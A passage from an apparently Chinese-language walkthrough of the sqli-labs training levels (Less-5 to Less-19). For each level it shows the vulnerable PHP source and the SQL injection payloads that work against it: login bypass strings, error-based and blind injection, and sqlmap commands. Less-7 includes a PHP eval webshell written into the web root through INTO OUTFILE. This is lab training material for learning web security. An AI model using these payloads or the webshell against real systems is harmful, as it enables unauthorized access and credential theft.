+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接单引号拼接</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持报错、布尔盲注、时间盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span>:</span><br><span class="line">    输出 You are in...........</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+
+<p>因为不输出查询的结果，故联合查询注入失效，其他注入方式照常。</p>
+</div><h2 id="0x05-less-6"><a href="#0x05-less-6" class="headerlink" title="0x05 less-6"></a>0x05 less-6</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">报错、布尔盲注、时间盲注</td>
+<td align="left"><code>id=&quot;$id&quot;</code></td>
+</tr>
+</tbody></table>
+<p>和 Less-5 利用方式一致，只是闭合方式不一样。</p>
+</div><h2 id="0x06-less-7"><a href="#0x06-less-7" class="headerlink" title="0x06 less-7"></a>0x06 less-7</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">报错、布尔盲注、时间盲注</td>
+<td align="left"><code>id=((&#39;$id&#39;))</code></td>
+</tr>
+</tbody></table>
+<p>输入<code>?id=1&#39;</code>，报错<code>near &#39;&#39;1&#39;&#39;)) LIMIT 0,1&#39; at line 1</code></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>和 Less-5 利用方式一致，只是闭合方式不一样。</p>
+<p>但</p>
+<p>本关作者留下明显的关键信息：<code>You are in.... Use outfile......</code></p>
+<p><code>into outfile</code>导出文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;))UNION SELECT 1,2,3 into outfile &quot;C:\\Users\\YHY\\Desktop\\uuu.txt&quot;%23</span></span><br></pre></td></tr></table></figure>
+
+<p><code>into outfile</code>写入文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;))UNION SELECT 1,2,&#x27;</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span><span class="string">&#x27; i</span></span><br><span class="line"><span class="string">nto outfile &quot;C/var/www/html/Less-7/1.php&quot;--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+</div><h2 id="0x07-less-8"><a href="#0x07-less-8" class="headerlink" title="0x07 less-8"></a>0x07 less-8</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">布尔盲注、延时盲注</td>
+<td align="left"><code>id=&#39;$id&#39;</code></td>
+</tr>
+</tbody></table>
+<p>源码<code>  //print_r(mysqli_error($con1));</code>注释了回显错误，报错注入不能使用</p>
+<p>其余的和 Less-7 注入方式一致，只是拼接方式不一样。</p>
+</div><h2 id="0x08-less-9"><a href="#0x08-less-9" class="headerlink" title="0x08 less-9"></a>0x08 less-9</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">延时盲注</td>
+<td align="left"><code>id=&#39;$id&#39;</code></td>
+</tr>
+</tbody></table>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用单引号拼接</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持时间盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span>:</span><br><span class="line">    输出 You are in............</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    输出 You are in...........</span><br></pre></td></tr></table></figure>
+
+<p>从源码中可以看到 <code>if else</code>都输出的是 <code>You are in……….. </code>这样就不能通过布尔盲注来进行注入了，只能用最慢的时间注入。时间注入细节可以参考 <code>Less-1</code> 的注入细节。</p>
+</div><h2 id="0x09-less-10"><a href="#0x09-less-10" class="headerlink" title="0x09 less-10"></a>0x09 less-10</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">延时盲注</td>
+<td align="left"><code>id=&quot;$id&quot;</code></td>
+</tr>
+</tbody></table>
+<p>和 Less-9 利用方式一样，只是拼接方式不一样。</p>
+</div><h2 id="0x0a-less-11"><a href="#0x0a-less-11" class="headerlink" title="0x0a less-11"></a>0x0a less-11</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">联合、报错、布尔盲注、延时盲注</td>
+<td align="left"><code>username=&#39;x&#39;</code></td>
+</tr>
+</tbody></table>
+<p>从这里开始就是POST方法</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> name=<span class="string">&quot;form1&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">	    &lt;input type=<span class="string">&quot;text&quot;</span>  name=<span class="string">&quot;uname&quot;</span> value=<span class="string">&quot;&quot;</span>/&gt;</span><br><span class="line">		&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;passwd&quot;</span> value=<span class="string">&quot;&quot;</span>/&gt;</span><br><span class="line">		&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))&#123;</span><br><span class="line">    ...</span><br><span class="line">    @<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span>:</span><br><span class="line">    输出查询的信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>hackbar</code>or<code>burpsuite</code>传参。</p>
+<p><code>SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1</code>是经典的登录处SQL注入</p>
+<p><code>SELECT username, password FROM users WHERE username=&#39;admin&#39;;</code>可成功查询，这也构造了经典的万能密码登录，即注释or闭合后面password</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注释后面语句 并 添加一个永真条件</span></span><br><span class="line">uname=admin<span class="string">&#x27; or 1 = 1--+passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string">uname=admin&amp;passwd=1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>--+&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=<span class="number">1</span><span class="string">&#x27;||1#&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 闭合后面语句 并 添加一个永真条件</span></span><br><span class="line"><span class="string">uname=admin&amp;passwd=1&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&amp;submit=Submit</span></span><br><span class="line"><span class="string">uname=admin&amp;passwd=1&#x27;</span>||<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p>其余注入与get区别不大，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=<span class="number">1</span><span class="string">&#x27;union+select+1,(SELECT GROUP_CONCAT(username,password) FROM users)#&amp;submit=Submit</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span> <span class="keyword">and</span> left(database(),<span class="number">1</span>)&gt;<span class="string">&#x27;r&#x27;</span><span class="comment">#&amp;passwd=&amp;submit=Submit</span></span><br><span class="line">uname=admin<span class="string">&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p>如果使用sqlmap，则有两种方法：</p>
+<p>①复制请求报文于<code>1.txt</code>文件中，然后<code>sqlmap.py -r 1.txt</code></p>
+<p>②直接使用–data参数，<code>sqlmap -u &quot;http://127.0.0.1:8888/Less-11/&quot; --data=&quot;uname=admin&amp;passwd=2333&amp;submit=Submit&quot;</code>【但该方法，操作效率较低】</p>
+<p>因为有多个参数，可以使用<code>-p &quot;参数&quot;</code>来指定sqlmap测试的参数</p>
+<p>其余和less-1中sqlmap注入方法一致</p>
+<blockquote>
+<p>注意hackbar，得是<code>application/x-www-form-urlencoded (raw)</code>才能【自我测试】</p>
+</blockquote>
+</div><h2 id="0x0b-less-12"><a href="#0x0b-less-12" class="headerlink" title="0x0b less-12"></a>0x0b less-12</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">联合、报错、布尔盲注、延时盲注</td>
+<td align="left"><code>username=(&quot;x&quot;)</code></td>
+</tr>
+</tbody></table>
+<p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同。</p>
+</div><h2 id="0x0c-less-13"><a href="#0x0c-less-13" class="headerlink" title="0x0c less-13"></a>0x0c less-13</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">报错、布尔盲注、延时盲注</td>
+<td align="left"><code>username=(&#39;x&#39;)</code></td>
+</tr>
+</tbody></table>
+<p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他不变。</p>
+</div><h2 id="0x0d-less-14"><a href="#0x0d-less-14" class="headerlink" title="0x0d less-14"></a>0x0d less-14</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">报错、布尔盲注、延时盲注</td>
+<td align="left"><code>username=&quot;x&quot;</code></td>
+</tr>
+</tbody></table>
+<p>和 Less-13 的利用方式一样，只是 SQL 拼接方式不同。</p>
+</div><h2 id="0x0e-less-15"><a href="#0x0e-less-15" class="headerlink" title="0x0e less-15"></a>0x0e less-15</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">布尔盲注、延时盲注</td>
+<td align="left"><code>username=&#39;x&#39;</code></td>
+</tr>
+</tbody></table>
+<p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者时间盲注。</p>
+</div><h2 id="0x0f-less-16"><a href="#0x0f-less-16" class="headerlink" title="0x0f less-16"></a>0x0f less-16</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">布尔盲注、延时盲注</td>
+<td align="left"><code>username=(&quot;x&quot;)</code></td>
+</tr>
+</tbody></table>
+<p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p>
+</div><h2 id="0x10-less-17"><a href="#0x10-less-17" class="headerlink" title="0x10 less-17"></a>0x10 less-17</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">报错、布尔盲注、延时盲注</td>
+<td align="left"><code>password = &#39;$passwd&#39;</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)截断，限制长度</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">	&#123;<span class="comment">#获取当前 magic_quotes_gpc 的配置选项设置，PHP7.4废弃</span></span><br><span class="line">		<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Quote if not a number</span></span><br><span class="line">	<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))<span class="comment">#ctype_digit()：检测字符串中的字符是否都为纯数字</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">#mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span></span><br><span class="line">       <span class="comment"># 受影响的字符：\x00 \n \r \ &#x27; &quot; \x1a</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># uname 参数被使用mysqli_real_escape_string()过滤了</span></span><br><span class="line"><span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏</span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select 结果正确:</span><br><span class="line">    <span class="comment"># 更新语句 使用单引号拼接 passwd</span></span><br><span class="line">    <span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mysql 报错:</span><br><span class="line">            print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+
+<p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=</span><br><span class="line">    <span class="number">1</span><span class="string">&#x27; and (updatexml(1,concat(0x7e,version(),0x7e),1))#</span></span><br></pre></td></tr></table></figure>
+
+<p>时间/布尔盲注：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=</span><br><span class="line">    <span class="number">2</span><span class="string">&#x27; and sleep(if(length(database())=10,0,2)) and &#x27;</span><span class="number">1</span><span class="string">&#x27; =&#x27;</span><span class="number">1</span></span><br><span class="line">    <span class="number">11</span><span class="string">&#x27;and If(ascii(substr(database(),1,1))=114,1,sleep(5))</span></span><br><span class="line"><span class="string">    #上面的注释闭合谨慎使用，不然得重置数据库，也可能返回500，因为每一字段都执行sleep(5)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">布尔：</span></span><br><span class="line"><span class="string">2&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>,(select table_name <span class="keyword">from</span> information_schema.tables),<span class="number">0</span>) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure>
+
+<p>因为对自己的布尔Payload感觉不对劲，这有点像是布尔和报错的组合</p>
+<p>尝试使用sqlmap.py进行注入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://192.168.0.101/sqli/Less-17/ --data=<span class="string">&quot;uname=admin&amp;passwd=1&amp;submit=Submit&quot;</span> -p <span class="string">&quot;passwd&quot;</span> --dbms=mysql --flush-session --technique=B -v 3 -level=5</span><br></pre></td></tr></table></figure>
+
+<p><strong>失败！</strong></p>
+<p>测试中发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET password = <span class="string">&#x27;2&#x27;</span> <span class="keyword">or</span> sleep(<span class="keyword">if</span>(length(database())=<span class="number">10</span>,<span class="number">0</span>,<span class="number">2</span>)) where username =<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">password改成<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;2&#x27;</span> <span class="keyword">or</span> sleep(<span class="keyword">if</span>(length(database())=<span class="number">10</span>,<span class="number">0</span>,<span class="number">2</span>))进行了布尔运算，返回<span class="literal">TRUE</span>，最后弱类型成<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</div><h2 id="0x11-less-18"><a href="#0x11-less-18" class="headerlink" title="0x11 less-18"></a>0x11 less-18</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">报错、布尔盲注、延时盲注</td>
+<td align="left"><code>VALUES (&#39;$uagent&#39;)</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取请求的 uagent 和 ip 地址</span></span><br><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 输入了uname 和 passwd:</span><br><span class="line">    <span class="comment"># 对这两个参数进行过滤</span></span><br><span class="line">    <span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    <span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SQL语句有返回结果:</span><br><span class="line">        <span class="comment"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤</span></span><br><span class="line">        <span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line">            输出 <span class="variable">$uagent</span>;</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+
+<p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和时间盲注。</p>
+<ul>
+<li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li>
+<li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li>
+<li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li>
+</ul>
+<p>所以这里的 IP 是无法被伪造的，这里只能通过修改 <code>user-agent</code> 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式【注释也行，但得补充插入的值】来闭合掉后面的语句。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">报错</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,version(),0x7e),1) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">布尔</span><br><span class="line"><span class="number">2</span><span class="string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="string">&#x27;,(select table_name from information_schema.tables),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">时间</span><br><span class="line"><span class="number">2</span><span class="string">&#x27; and sleep(if(length(database())=10,0,2)) and &#x27;</span><span class="number">1</span><span class="string">&#x27; =&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为对自己的布尔Payload感觉不对劲，这有点像是布尔和报错的组合</p>
+<p>尝试使用sqlmap.py进行注入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://192.168.0.101/sqli/Less-18/ --data=<span class="string">&quot;uname=admin&amp;passwd=1&amp;submit=Submit&quot;</span> -p <span class="string">&quot;passwd&quot;</span> --dbms=mysql --flush-session --technique=B -v 3 -level=5</span><br></pre></td></tr></table></figure>
+
+<p><strong>失败！</strong></p>
+</div><h2 id="0x12-less-19"><a href="#0x12-less-19" class="headerlink" title="0x12 less-19"></a>0x12 less-19</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">POST</td>
+<td align="left">报错、布尔盲注、延时盲注</td>
+<td align="left"><code>VALUES (&#39;$uagent&#39;)</code></td>
+</tr>
+</tbody></table>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取请求的 referer 和 ip 地址</span></span><br><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 输入了uname 和 passwd:</span><br><span class="line">    <span class="comment"># uname 和 passwd 参数均被过滤</span></span><br><span class="line">    <span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    <span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SQL语句有返回结果:</span><br><span class="line">        <span class="comment"># 单引号拼接后直接带入 insert 语句</span></span><br><span class="line">        <span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br><span class="line">        输出 <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]</span><br><span class="line">        print_r(mysql_error());    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print_r(mysql_error());    </span><br></pre></td></tr></table></figure>
+
+<p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本一样</p>
+<blockquote>
